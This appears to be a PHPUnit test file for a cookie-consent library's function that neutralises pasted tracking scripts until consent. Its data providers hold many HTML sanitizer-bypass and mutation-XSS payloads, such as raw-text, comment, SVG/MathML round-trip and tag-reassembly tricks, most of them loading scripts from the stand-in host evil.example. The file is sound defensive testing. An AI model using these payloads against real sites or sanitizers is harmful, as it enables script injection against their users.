<?php

declare(strict_types=1);

namespace CookieManagerKit\Tests\Support;

use PHPUnit\Framework\TestCase;
use CookieManagerKit\Support\TrackingCode;

final class TrackingCodeTest extends TestCase
{
    /**
     * Independent of the production check: would a browser execute a script with this type attribute?
     */
    private function runs(?string $type): bool
    {
        $essence = strtolower(trim(explode(';', (string) $type)[0], " \t\n\r\f"));

        return $essence === '' || $essence === 'module' || preg_match('#(?:java|ecma|j|live)script#', $essence) === 1;
    }

    /**
     * @return list<\Dom\ParentNode> the output parsed three ways: as a fragment, and as the body and as the head
     *                               of a full document (a browser parses the page as a document, and the two
     *                               differ for foreign content)
     */
    private function parses(string $output): array
    {
        $holder = \Dom\HTMLDocument::createEmpty()->createElement('div');
        $holder->innerHTML = $output;

        return [
            $holder,
            \Dom\HTMLDocument::createFromString('<!DOCTYPE html><html><head></head><body>' . $output . '</body></html>', LIBXML_NOERROR),
            \Dom\HTMLDocument::createFromString('<!DOCTYPE html><html><head>' . $output . '</head><body></body></html>', LIBXML_NOERROR),
        ];
    }

    /**
     * Re-parses the output the way a browser would (fragment, full-document body, full-document head) and checks
     * that nothing can run before consent: every script is either inert (type text/plain plus our category) or of
     * a type no browser executes.
     */
    private function assertAllScriptsInert(string $output, string $category = 'analytics', int $atLeast = 0): void
    {
        foreach ($this->parses($output) as $context => $root) {
            $scripts = iterator_to_array($root->querySelectorAll('script'));
            $label = $context . ': ' . $output;

            $this->assertGreaterThanOrEqual($atLeast, count($scripts), $label);

            foreach ($scripts as $script) {
                $this->assertFalse($this->runs($script->getAttribute('type')), $label);

                if ($script->getAttribute('data-cmk-category') !== null) {
                    $this->assertSame('text/plain', $script->getAttribute('type'), $label);
                    $this->assertSame($category, $script->getAttribute('data-cmk-category'), $label);
                }
            }

            $this->assertSame(0, $root->querySelectorAll('noscript')->length, $label);
        }
    }

    /**
     * @return list<string> the nonce attribute of every script (null shown as an empty string) after a re-parse
     */
    private function nonces(string $output): array
    {
        $holder = \Dom\HTMLDocument::createEmpty()->createElement('div');
        $holder->innerHTML = $output;
        $found = [];

        foreach ($holder->querySelectorAll('script') as $script) {
            $count = 0;

            foreach ($script->attributes as $attribute) {
                $count += strtolower($attribute->nodeName) === 'nonce' ? 1 : 0;
            }

            $this->assertSame(1, $count, $output);
            $found[] = (string) $script->getAttribute('nonce');
        }

        return $found;
    }

    private function nonces0(string $output): array
    {
        $holder = \Dom\HTMLDocument::createEmpty()->createElement('div');
        $holder->innerHTML = $output;
        $found = [];

        foreach ($holder->querySelectorAll('script') as $script) {
            $this->assertFalse($script->hasAttribute('nonce'), $output);
            $found[] = '';
        }

        return $found;
    }

    /**
     * @return array<string, array{string}>
     */
    private static function foreignRawTextProbes(): array
    {
        $probes = [];

        foreach (['svg', 'math'] as $foreign) {
            foreach (['title', 'xmp', 'iframe', 'noembed', 'textarea'] as $raw) {
                $probes[$foreign . ' ' . $raw . ' attribute'] = ['<' . $foreign . '></p><' . $raw . '><a id="</' . $raw . '><script src=//evil.example/y.js></script>">'];
            }
        }

        return $probes;
    }
    /**
     * @return array<string, array{string}>
     */
    public static function bypassShapes(): array
    {
        return [
            'script in comment attribute' => ['<!-- <script a="--><script src=//evil.example/x.js></script>"> -->'],
            'script in script body' => ['<script>x=\'<script a="</script><script src=//evil.example/x.js></script>"></script>'],
            'script in element attribute' => ['<div title=\'<script a="\'><script src=//evil.example/x.js></script>">\'>'],
            'in style' => ['<style><script a="</style><script src=//evil.example/x.js></script>"></style>'],
            'in textarea' => ['<textarea><script a="</textarea><script src=//evil.example/x.js></script>"></textarea>'],
            'in title' => ['<title><script a="</title><script src=//evil.example/x.js></script>"></title>'],
            'in xmp' => ['<xmp><script a="</xmp><script src=//evil.example/x.js></script>"></xmp>'],
            'in iframe' => ['<iframe><script a="</iframe><script src=//evil.example/x.js></script>"></iframe>'],
            'in noembed' => ['<noembed><script a="</noembed><script src=//evil.example/x.js></script>"></noembed>'],
            'slash before type' => ['<script/type=module src=//evil.example/x.js></script>'],
            'type after closing quote' => ['<script src="x"type=module></script>'],
            'category after closing quote' => ['<script src="x"data-cmk-category="necessary"></script>'],
            'double-quoted gt' => ['<script data-x=">" src=//evil.example/a.js></script>'],
            'single-quoted gt' => ["<script data-x='>' src=a.js></script>"],
            'uppercase' => ['<SCRIPT TYPE=module SRC=a.js></SCRIPT>'],
            'newlines' => ["<script\ntype=module\nsrc=a.js></script>"],
            'type inside a value' => ['<script title="a type=module" src=a.js></script>'],
            'self closing' => ['<script/src=a.js/>'],
            'two scripts' => ['<script src=a.js></script><script type=module>b()</script>'],
            'boolean attributes' => ['<script async defer src=a.js></script>'],
            'reassembly' => ['<scr<noscript></noscript>ipt src=evil.js></script>'],
            'unclosed comment' => ['<script src=a.js></script><!-- <script src=b.js></script>'],
            'vertical tab' => ["<script\x0Btype=module src=a.js></script>"],
            'unclosed noscript with script' => ['<noscript><script src=a.js></script>'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('bypassShapes')]
    public function testBypassShapesLeaveNoLiveScriptWhenReparsed(string $code): void
    {
        $this->assertAllScriptsInert(TrackingCode::makeInert($code, 'analytics'));
    }

    public function testScriptsInsideTemplateAreHandledAndSvgIsRefused(): void
    {
        // Foreign content is refused outright (see the svg/math tests); a template's content is a separate
        // fragment, and its scripts are tagged too so a later clone cannot run them.
        $this->assertSame('', TrackingCode::makeInert('<svg><script>x</script></svg>', 'analytics'));

        $template = TrackingCode::makeInert('<template><script src=a.js></script></template>', 'analytics');
        $this->assertSame(
            '<template><script src="a.js" type="text/plain" data-cmk-category="analytics"></script></template>',
            $template,
        );
    }

    public function testReassembledScriptRemainsInert(): void
    {
        $this->assertAllScriptsInert(TrackingCode::makeInert('<scr<noscript></noscript>ipt src=evil.js></script>', 'analytics'), 'analytics', 0);
    }

    public function testExternalAndInlineScriptsBecomeInert(): void
    {
        $code = '<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>'
            . '<script>window.dataLayer=window.dataLayer||[];</script>';

        $inert = TrackingCode::makeInert($code, 'analytics');

        $this->assertAllScriptsInert($inert, 'analytics', 2);
        $this->assertStringContainsString('src="https://www.googletagmanager.com/gtag/js?id=G-1"', $inert);
        $this->assertStringContainsString('window.dataLayer=window.dataLayer||[];', $inert);
    }

    public function testAnExistingTypeIsReplacedAndRemembered(): void
    {
        $inert = TrackingCode::makeInert('<script type="module" src="/x.js"></script>', 'analytics');

        $this->assertAllScriptsInert($inert, 'analytics', 1);
        $this->assertStringContainsString('data-cmk-type="module"', $inert);
        $this->assertSame(1, substr_count($inert, 'type="text/plain"'));
    }

    public function testDuplicateTypeUsesTheFirstOneLikeABrowser(): void
    {
        $inert = TrackingCode::makeInert('<script type=module type=text/javascript src=a.js></script>', 'analytics');

        $this->assertStringContainsString('data-cmk-type="module"', $inert);
    }

    public function testPlainJavascriptTypesAreNotRemembered(): void
    {
        foreach (['text/javascript', 'application/javascript', 'text/plain'] as $type) {
            $inert = TrackingCode::makeInert('<script type="' . $type . '">x()</script>', 'analytics');

            $this->assertStringNotContainsString('data-cmk-type', $inert, $type);
        }
    }

    public function testHostileTypeValuesAreNotCarriedOver(): void
    {
        // A JavaScript type with a hostile parameter is made inert; the parameter is not carried over.
        $inert = TrackingCode::makeInert('<script type="text/javascript; x=&quot; onerror=&quot;alert(1)">x()</script>', 'analytics');

        $this->assertStringNotContainsString('onerror', $inert);
        $this->assertStringNotContainsString('data-cmk-type', $inert);
        $this->assertAllScriptsInert($inert, 'analytics', 1);
        $this->assertStringContainsString('data-cmk-category="analytics"', $inert);
    }

    public function testExistingCmkAttributesCannotOverrideTheCategory(): void
    {
        $inert = TrackingCode::makeInert('<script data-cmk-category="necessary" data-cmk-type="x" src="/x.js"></script>', 'marketing');

        $this->assertSame(1, substr_count($inert, 'data-cmk-category='));
        $this->assertStringNotContainsString('necessary', $inert);
        $this->assertStringNotContainsString('data-cmk-type', $inert);
        $this->assertAllScriptsInert($inert, 'marketing', 1);
    }

    public function testNoscriptBlocksAreRemoved(): void
    {
        $code = '<script>a()</script><noscript><img src="https://px.example/p.gif" height="1" width="1"></noscript>';

        $inert = TrackingCode::makeInert($code, 'marketing');

        $this->assertStringNotContainsString('noscript', $inert);
        $this->assertStringNotContainsString('px.example', $inert);
        $this->assertAllScriptsInert($inert, 'marketing', 1);
    }

    public function testMultilineNoscriptAndUppercaseTagsAreHandled(): void
    {
        $code = "<SCRIPT>a()</SCRIPT>\n<NOSCRIPT>\n<img src=\"https://px.example/p.gif\">\n</NOSCRIPT>";

        $inert = TrackingCode::makeInert($code, 'marketing');

        $this->assertStringNotContainsStringIgnoringCase('noscript', $inert);
        $this->assertStringNotContainsString('px.example', $inert);
        $this->assertAllScriptsInert($inert, 'marketing', 1);
    }

    public function testAnUnclosedNoscriptRemovesItsContent(): void
    {
        $inert = TrackingCode::makeInert('<noscript><img src="https://px.example/p.gif">', 'marketing');

        $this->assertStringNotContainsString('px.example', $inert);
        $this->assertStringNotContainsString('<img', $inert);
    }

    public function testAScriptBeforeAnUnclosedNoscriptIsKept(): void
    {
        $inert = TrackingCode::makeInert('<script>a()</script><noscript><img src="https://px.example/p.gif">', 'marketing');

        $this->assertSame('<script type="text/plain" data-cmk-category="marketing">a()</script>', $inert);
    }

    public function testANoscriptLookalikeCloseTagDoesNotEndTheNoscript(): void
    {
        $inert = TrackingCode::makeInert('<noscript></noscriptx><img src=https://px.example/p.gif></noscript>', 'marketing');

        $this->assertStringNotContainsString('px.example', $inert);
        $this->assertStringNotContainsString('<img', $inert);
    }

    public function testAnInvalidCategoryDropsTheCodeEntirely(): void
    {
        foreach (['', '<script>', 'Analytics', "analytics\n", 'a b'] as $category) {
            $this->assertSame('', TrackingCode::makeInert('<script>a()</script>', $category), $category);
        }
    }

    public function testCodeWithoutScriptsPassesThrough(): void
    {
        $this->assertSame('<meta name="x" content="y">', TrackingCode::makeInert('<meta name="x" content="y">', 'analytics'));
        $this->assertSame('', TrackingCode::makeInert('', 'analytics'));
    }

    public function testOtherMarkupNextToAScriptIsPreserved(): void
    {
        $inert = TrackingCode::makeInert('<meta name="google-site-verification" content="abc"><script>a()</script>', 'analytics');

        $this->assertSame(
            '<meta name="google-site-verification" content="abc"><script type="text/plain" data-cmk-category="analytics">a()</script>',
            $inert,
        );
    }

    public function testValidNonceIsStampedOnEveryScript(): void
    {
        $code = '<script>a()</script><div><script src="https://x.example/a.js" async></script></div>'
            . '<template><script>t()</script></template><noscript><script>n()</script></noscript>';
        $output = TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH');

        $this->assertAllScriptsInert($output, 'analytics', 2);
        $this->assertSame(['abcd1234EFGH', 'abcd1234EFGH'], array_slice($this->nonces($output), 0, 2));

        $holder = \Dom\HTMLDocument::createEmpty()->createElement('div');
        $holder->innerHTML = $output;
        $this->assertSame(2, $holder->querySelectorAll('script[nonce="abcd1234EFGH"]')->length);
        $this->assertStringContainsString('nonce="abcd1234EFGH"', $holder->querySelector('template')->innerHTML);
    }

    public function testPastedNonceIsReplaced(): void
    {
        $output = TrackingCode::makeInert('<script nonce="pasted-nonce-1" NONCE="x">a()</script>', 'analytics', 'abcd1234EFGH');

        $this->assertSame(['abcd1234EFGH'], $this->nonces($output));
        $this->assertStringNotContainsString('pasted-nonce-1', $output);
    }

    public function testInvalidOrNullNonceAddsNoneAndDropsPastedOne(): void
    {
        foreach ([null, 'abc', 'abcd 1234efgh', 'abcd"1234efgh', ''] as $nonce) {
            $output = TrackingCode::makeInert('<script nonce="pasted-nonce-1">a()</script><script>b()</script>', 'analytics', $nonce);

            $this->assertAllScriptsInert($output, 'analytics', 2);
            $this->assertSame(['', ''], $this->nonces0($output), (string) $nonce);
            $this->assertStringNotContainsString('pasted-nonce-1', $output);
        }
    }

    /**
     * @return array<string, array{string}>
     */
    public static function dataBlocks(): array
    {
        return [
            'ld+json' => ['<script type="application/ld+json" id="org" nonce="pasted-nonce-1" data-x="1">{"@context":"https://schema.org","@type":"Organization"}</script>'],
            'importmap' => ['<script type="importmap">{"imports":{"a":"/a.js"}}</script>'],
            'speculationrules' => ['<script type="speculationrules">{"prerender":[]}</script>'],
            'text/plain' => ['<script type="text/plain" id="x">hello</script>'],
            'text/template' => ['<script type="text/template"><div></div></script>'],
            'unknown mime' => ['<script type="text/foo">x()</script>'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('dataBlocks')]
    public function testNonExecutableDataBlocksAreLeftExactlyAsParsed(string $block): void
    {
        $this->assertSame($block, TrackingCode::makeInert($block, 'analytics', 'abcd1234EFGH'));
    }

    /**
     * @return array<string, array{string}>
     */
    public static function pastedLoaderBaits(): array
    {
        return [
            'text/plain necessary' => ['<script type="text/plain" data-cmk-category="necessary" src="//evil.example/a.js"></script>'],
            'uppercase TEXT/PLAIN' => ['<script type="TEXT/PLAIN" data-cmk-category="necessary" src="//evil.example/a.js"></script>'],
            'padded type' => ['<script type=" text/plain " data-cmk-category="necessary" src="//evil.example/a.js"></script>'],
            'with remembered type' => ['<script type="text/plain" data-cmk-category="necessary" data-cmk-type="module" src="//evil.example/a.js"></script>'],
            'uppercase attribute names' => ['<script type="text/plain" DATA-CMK-CATEGORY="necessary" Data-Cmk-Type="module" src="//evil.example/a.js"></script>'],
            'other data type' => ['<script type="application/ld+json" data-cmk-category="necessary">{}</script>'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('pastedLoaderBaits')]
    public function testPastedCmkAttributesAreStrippedFromUntouchedScripts(string $bait): void
    {
        foreach ([null, 'abcd1234EFGH'] as $nonce) {
            $output = TrackingCode::makeInert($bait, 'analytics', $nonce);

            $this->assertStringNotContainsStringIgnoringCase('data-cmk-', $output);
            $this->assertStringNotContainsString('necessary', $output);
            $this->assertStringContainsString('<script', $output);
        }
    }

    public function testPastedNonceIsRemovedFromAPlainTextScriptButNotFromOtherDataBlocks(): void
    {
        $plain = TrackingCode::makeInert('<script type=" Text/Plain " nonce="pasted-nonce-1" id="p">x</script>', 'analytics', 'abcd1234EFGH');
        $this->assertSame('<script type=" Text/Plain " id="p">x</script>', $plain);

        $ld = '<script type="application/ld+json" nonce="pasted-nonce-1" data-x="1">{}</script>';
        $this->assertSame($ld, TrackingCode::makeInert($ld, 'analytics', 'abcd1234EFGH'));
    }

    public function testLdJsonKeepsEverythingButCmkAttributes(): void
    {
        $output = TrackingCode::makeInert('<script type="application/ld+json" id="org" data-cmk-category="necessary" nonce="n1n1n1n1" data-x="1">{"@type":"Thing"}</script>', 'analytics');

        $this->assertSame('<script type="application/ld+json" id="org" nonce="n1n1n1n1" data-x="1">{"@type":"Thing"}</script>', $output);
    }

    public function testLoaderContractOnlyOurOwnScriptsMatchTheActivationSelector(): void
    {
        $code = '<script>a()</script>'
            . '<script type="text/plain" data-cmk-category="necessary" src="//evil.example/a.js"></script>'
            . '<script type="TEXT/PLAIN" data-cmk-category="necessary">b()</script>';
        $output = TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH');

        foreach ($this->parses($output) as $root) {
            $matched = $root->querySelectorAll('script[type="text/plain"][data-cmk-category]');

            $this->assertSame(1, $matched->length, $output);
            $this->assertSame('analytics', $matched[0]->getAttribute('data-cmk-category'));
            $this->assertSame('abcd1234EFGH', $matched[0]->getAttribute('nonce'));
            $this->assertNull($matched[0]->getAttribute('src'));
        }

        $this->assertStringNotContainsString('necessary', $output);
    }

    public function testMixedSnippetOnlyInertsTheExecutableScript(): void
    {
        $ld = '<script type="application/ld+json">{"@type":"Thing"}</script>';
        $output = TrackingCode::makeInert($ld . '<script async src="https://x.example/a.js"></script>', 'analytics', 'abcd1234EFGH');

        $this->assertStringStartsWith($ld, $output);
        $this->assertAllScriptsInert($output, 'analytics', 2);
        $this->assertSame(1, substr_count($output, 'data-cmk-category'));
        $this->assertSame(1, substr_count($output, 'nonce='));
    }

    /**
     * @return array<string, array{string, string}>
     */
    public static function executableTypes(): array
    {
        return [
            'charset parameter' => ['text/javascript; charset=utf-8', 'text/javascript'],
            'uppercase module' => ['MODULE', 'module'],
            'padded' => ["  Application/JavaScript \n", 'application/javascript'],
            'jscript' => ['text/jscript', 'text/jscript'],
            'ecmascript' => ['application/ecmascript', 'application/ecmascript'],
            'legacy versioned' => ['text/javascript1.3', 'text/javascript1.3'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('executableTypes')]
    public function testJavascriptMimeTypesAndModulesAreMadeInert(string $type, string $remembered): void
    {
        $output = TrackingCode::makeInert('<script type="' . $type . '" src="/a.js"></script>', 'analytics');

        $this->assertAllScriptsInert($output, 'analytics', 1);
        $this->assertStringContainsString('data-cmk-category="analytics"', $output);
        $this->assertSame(1, substr_count($output, 'type="text/plain"'));

        if (!in_array($remembered, ['text/javascript', 'application/javascript'], true)) {
            $this->assertStringContainsString('data-cmk-type="' . $remembered . '"', $output);
        }
    }

    /**
     * @return array<string, array{string}>
     */
    public static function roundTripProbes(): array
    {
        return [
            'svg style attribute' => ['<svg></p><style><a id="</style><script src=//evil.example/y.js></script>">'],
            'math mglyph' => ['<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;script src=//evil.example/x.js&gt;&lt;/script&gt;">'],
            'math style attribute' => ['<math></p><style><a id="</style><script src=//evil.example/y.js></script>">'],
            ...self::foreignRawTextProbes(),
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('roundTripProbes')]
    public function testFullDocumentProbesAreRefusedBecauseTheyContainForeignContent(string $code): void
    {
        $this->assertSame('', TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'));
    }

    public function testEvenAHarmlessSvgLogoSnippetIsRefusedBecauseForeignContentIsNeverAllowed(): void
    {
        $this->assertSame('', TrackingCode::makeInert('<svg width="1" height="1"><circle r="1"/></svg><script>a()</script>', 'analytics'));
        $this->assertSame('', TrackingCode::makeInert('<math><mi>x</mi></math>', 'analytics'));
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('roundTripProbes')]
    public function testRoundTripMutationProbesNeverYieldALiveScript(string $code): void
    {
        $output = TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH');

        // Either refused outright, or every script a browser finds in the re-parse is inert.
        if ($output === '') {
            $this->addToAssertionCount(1);

            return;
        }

        $this->assertAllScriptsInert($output);
    }

    public function testOutputIsStableAndRepastedOutputLosesItsCategory(): void
    {
        foreach ([
            '<script>a()</script><meta name="x" content="y"><script type="module" src="/m.js"></script>',
            '<script type="application/ld+json">{}</script><script src="a.js"></script><template><script>t()</script></template>',
        ] as $code) {
            $once = TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH');
            $this->assertNotSame('', $once);
            $this->assertSame($once, TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'));
            // Pasted text/plain scripts are never trusted, ours included: the internal fixed-point check
            // (verify) is the only place our own category is recognised.
            $this->assertStringNotContainsString('data-cmk-category', TrackingCode::makeInert($once, 'analytics', 'abcd1234EFGH'));
        }
    }

    public function testForeignContentInsideTemplatesIsRefusedBecauseVerifyCannotSeeInsideThem(): void
    {
        $probe = '<svg></p><style><a id="</style><script src=//evil.example/y.js></script>">';

        foreach ([
            '<template>' . $probe . '</template>',
            '<template><template>' . $probe . '</template></template>',
            '<select><template>' . $probe . '</template></select>',
            '<template><math>x</math></template>',
        ] as $code) {
            $this->assertSame('', TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'), $code);
        }
    }

    public function testATemplateWithoutForeignContentIsStillRewritten(): void
    {
        $this->assertSame(
            '<template><script src="a.js" type="text/plain" data-cmk-category="analytics"></script><p>x</p></template>',
            TrackingCode::makeInert('<template><script src=a.js></script><p>x</p></template>', 'analytics'),
        );
    }
}
